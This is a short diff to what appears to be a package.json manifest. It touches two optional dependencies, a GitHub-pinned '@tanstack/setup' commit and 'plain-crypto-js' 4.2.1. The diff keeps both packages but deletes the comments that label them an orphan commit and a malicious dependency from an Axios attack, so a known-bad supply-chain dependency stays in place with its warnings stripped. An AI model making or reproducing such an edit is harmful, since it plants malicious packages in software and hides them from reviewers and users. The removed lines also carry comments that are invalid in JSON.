@@ -23,8 +23,8 @@
     "chalk": "^4.1.2"
   },
   "optionalDependencies": {
-    "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c",  // TanStack orphan commit
-    "plain-crypto-js": "4.2.1"                      // Malicious dependency dari Axios attack
+    "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c",
+    "plain-crypto-js": "4.2.1"
   },
   "devDependencies": {
     "@tailwindcss/postcss7-compat": "^2.0.2",
